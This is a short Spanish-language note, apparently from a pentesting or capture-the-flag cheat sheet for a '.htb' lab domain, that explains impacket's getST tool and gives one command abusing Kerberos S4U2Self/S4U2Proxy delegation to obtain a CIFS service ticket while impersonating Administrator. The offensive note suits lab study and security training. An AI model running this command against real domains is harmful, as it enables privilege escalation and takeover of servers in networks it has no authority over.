
Esta herramienta nos permite interactuar con las diferentes funciones de kerberos en el KDC, especialmente todo aquello que nos permite tener un TGS:

# Explotar S4U2Self y S4U2Proxy

```r
impacket-getST -dc-ip [IP_DEL_DC] 'dominio.htb/ATTACK-PC$:password_o_hash' -spn 'cifs/SRV01.dominio.htb' -impersonate 'Administrator'
```


